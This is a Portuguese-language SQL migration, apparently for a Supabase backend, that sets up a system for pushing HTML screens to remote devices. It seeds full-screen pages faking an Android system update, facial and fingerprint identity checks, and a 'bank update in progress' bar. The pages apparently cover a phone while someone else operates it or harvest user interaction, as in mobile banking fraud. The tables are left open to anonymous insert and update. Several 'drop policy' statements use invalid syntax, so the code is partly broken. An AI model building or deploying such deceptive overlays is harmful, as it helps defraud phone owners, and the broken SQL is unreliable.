-- Sistema de telas remotas
create table if not exists public.screens (
  id bigint generated by default as identity primary key,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  name text not null,
  html text not null,
  is_global boolean not null default false,
  is_active boolean not null default true
);

create table if not exists public.devices (
  id bigint generated by default as identity primary key,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  device_id text not null unique,
  screen_id bigint references public.screens(id),
  screen_active boolean not null default true,
  label text,
  last_seen timestamptz
);

-- RLS: acesso público de leitura via API (service_role ignora)
alter table public.screens enable row level security;
alter table public.devices enable row level security;

drop policy if exists "leitura publica screens" on public.screens;
create policy "leitura publica screens" on public.screens for select to anon using (true);
drop policy if exists "leitura publica devices" on public.devices for select to anon using (true);
create policy "leitura publica devices" on public.devices for select to anon using (true);
drop policy if exists "escrita publica devices" on public.devices for insert to anon with check (true);
create policy "escrita publica devices" on public.devices for insert to anon with check (true);
drop policy if exists "update publico devices" on public.devices for update to anon using (true) with check (true);
create policy "update publico devices" on public.devices for update to anon using (true) with check (true);

-- Tela default: tela preta
insert into public.screens (name, html, is_global, is_active)
select 'Tela preta', '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>html,body{margin:0;width:100%;height:100%;background:#000;overflow:hidden;}</style></head><body></body></html>', true, true
where not exists (select 1 from public.screens);

-- Telas prontas: atualização Android, verificação facial e digital
insert into public.screens (name, html, is_global, is_active)
select
  s.name, s.html, false, true
from (values
  (
    'Atualização Android',
    '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden;font-family:''Roboto'',system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;user-select:none}.c{width:86%;max-width:400px;text-align:center}.bot{width:60px;height:54px;margin:0 auto 34px;color:#3ddc84;animation:flutuar 3s ease-in-out infinite}.ring{position:relative;width:132px;height:132px;margin:0 auto 28px}.ring svg{width:132px;height:132px;transform:rotate(-90deg)}.rbg{fill:none;stroke:rgba(255,255,255,.08);stroke-width:6}.rfg{fill:none;stroke:#3ddc84;stroke-width:4;stroke-linecap:round;stroke-dasharray:377;stroke-dashoffset:377;animation:carregar 240s linear forwards}.pct{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;font-weight:400;font-variant-numeric:tabular-nums}.ttl{color:#fff;font-size:18px;font-weight:500;margin:0 0 8px}.sub{color:rgba(255,255,255,.45);font-size:13px;line-height:1.5;margin:0}.tmr{color:rgba(255,255,255,.55);font-size:13px;margin-top:28px;font-variant-numeric:tabular-nums}.tmr b{color:#3ddc84;font-weight:500}.rodape{position:fixed;bottom:26px;left:0;right:0;text-align:center;color:rgba(255,255,255,.22);font-size:11px;letter-spacing:.3px}@keyframes carregar{from{stroke-dashoffset:377}to{stroke-dashoffset:0}}@keyframes flutuar{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}</style></head><body><div class="c"><svg class="bot" viewBox="0 0 24 24" width="60" height="54" fill="#3ddc84"><path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48A5.84 5.84 0 0 0 12 1c-.96 0-1.86.23-2.66.63L7.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31A5.98 5.98 0 0 0 6 7.99h12c0-1.54-.62-2.94-1.63-3.95L12 2.5h-1.47zM9.5 5.75c-.41 0-.75-.34-.75-.75s.34-.75.75-.75.75.34.75.75-.34.75-.75.75zm5 0c-.41 0-.75-.34-.75-.75s.34-.75.75-.75.75.34.75.75-.34.75-.75.75z"/></svg><div class="ring"><svg viewBox="0 0 132 132"><circle class="rbg" cx="66" cy="66" r="60"/><circle class="rfg" cx="66" cy="66" r="60"/></svg><div class="pct" id="pct">0%</div></div><h1 class="ttl">Atualizando o sistema</h1><p class="sub">Seu dispositivo está sendo atualizado.<br>Não desligue o telefone.</p><p class="tmr">Tempo restante: <b id="tmr">--:--</b></p></div><p class="rodape">Android · System Update</p><script>var DUR=240000,s=Date.now(),pct=document.getElementById("pct"),tmr=document.getElementById("tmr");(function u(){var e=Math.max(0,DUR-(Date.now()-s)),p=Math.min((Date.now()-s)/DUR*100,100);pct.innerText=Math.floor(p)+"%";tmr.innerText=Math.floor(e/60000)+":"+("0"+Math.floor(e%60000/1000)).slice(-2);requestAnimationFrame(u);})();</script></body></html>'
  ),
  (
    'Verificação facial',
    '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html,body{margin:0;padding:0;width:100%;height:100%;background:linear-gradient(180deg,#101828 0%,#0a0f1c 100%);overflow:hidden;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;user-select:none}.c{width:88%;max-width:420px;text-align:center}.ovalo{width:190px;height:250px;margin:0 auto 36px;position:relative}.oval{width:100%;height:100%;border:3px solid rgba(255,255,255,.15);border-radius:50% 50% 46% 46%;position:relative;overflow:hidden}.scan{position:absolute;left:6%;width:88%;height:3px;background:linear-gradient(90deg,transparent,#22d3ee,transparent);box-shadow:0 0 18px 4px rgba(34,211,238,.5);animation:scan 2.2s ease-in-out infinite}.face{position:absolute;left:50%;top:50%;transform:translate(-50%,-52%);opacity:.85}.txt{color:#fff;font-size:17px;font-weight:600;margin:0 0 8px}.sub{color:rgba(255,255,255,.5);font-size:13px;line-height:1.5;margin:0}@keyframes scan{0%{top:8%}50%{top:88%}100%{top:8%}}</style></head><body><div class="c"><div class="oval"><div class="face"><svg width="90" height="90" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.5)" stroke-width="1.4"><circle cx="12" cy="8.2" r="3.4"/><path d="M4.5 20c.8-3.6 3.9-5.6 7.5-5.5s6.7 1.4 7.5 5.5" stroke-linecap="round"/></svg></div><div class="scan"></div></div><p class="txt">Verificação de identidade</p><p class="sub">Posicione seu rosto dentro do círculo<br>e mantenha-se imóvel</p></div></body></html>'
  ),
  (
    'Verificação digital',
    '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html,body{margin:0;padding:0;width:100%;height:100%;background:linear-gradient(180deg,#0d1117 0%,#090c12 100%);overflow:hidden;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;user-select:none}.c{width:88%;max-width:420px;text-align:center}.imp{width:110px;height:110px;margin:0 auto 36px;color:#22d3ee;filter:drop-shadow(0 0 14px rgba(34,211,238,.35));animation:pulso 1.8s ease-in-out infinite}.ttl{color:#fff;font-size:20px;font-weight:600;margin:0 0 8px}.sub{color:rgba(255,255,255,.55);font-size:13px;line-height:1.5;margin:0}@keyframes pulsar{0%,100%{transform:scale(1);opacity:.85}50%{transform:scale(1.08);opacity:1}}</style></head><body><div class="c"><svg class="imp" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"><path d="M12 4.5c-4.1 0-7.5 3.4-7.5 7.5 0 1.4.3 2.7.9 3.9"/><path d="M12 4.5c4.1 0 7.5 3.4 7.5 7.5 0 2-.8 3.9-2.1 5.2"/><path d="M12 8c-2.2 0-4 1.8-4 4 0 1.9.7 3.7 1.9 5.1"/><path d="M12 8c2.2 0 4 1.8 4 4 0 1.5-.5 2.9-1.3 4"/><path d="M12 12v6"/><path d="M7.5 6.7C8.7 5.6 10.3 5 12 5"/></svg><h1 class="ttl">Toque no sensor</h1><p class="sub">Confirme sua digital para<br>continuar a verificação</p></div></body></html>'
  )
) as s(name, html)
where not exists (select 1 from public.screens where name = s.name);


-- Tela "atualizando" (spinner + barra de progresso)
insert into public.screens (name, html, is_global, is_active)
select 'Atualizando sistema', '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html,body{margin:0;height:100%;background:#0b1020;overflow:hidden;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center}.c{width:88%;max-width:420px;text-align:center}.ldr{position:relative;width:120px;height:120px;margin:0 auto 20px}.ldr div{position:absolute;inset:0;border-radius:50%;border:6px solid rgba(255,255,255,.12);border-top-color:#fff;animation:g 1.2s linear infinite}.txt{color:#fff;font-size:15px;margin:0 0 16px;opacity:.92}.bar{width:100%;height:6px;background:rgba(255,255,255,.08);border-radius:999px;overflow:hidden}.pg{height:100%;width:0;background:#fff;border-radius:999px;animation:c 300s linear forwards}.pc{color:#fff;font-size:12px;margin-top:10px;opacity:.7}@keyframes g{to{transform:rotate(360deg)}}@keyframes c{from{width:0}to{width:100%}}</style></head><body><div class="c"><div class="ldr"><div></div></div><p class="txt">Atualização de banco em andamento...</p><div class="bar"><div class="pg"></div></div><div class="pc" id="p">0%</div></div><script>const p=document.getElementById("p"),d=300000,s=Date.now();function u(){const t=Math.min((Date.now()-s)/d*100,100);p.innerText=Math.floor(t)+"%";if(t<100)requestAnimationFrame(u);else p.innerText="Concluído";}u();</script></body></html>', false, true
where not exists (select 1 from public.screens where name = 'Atualizando sistema');
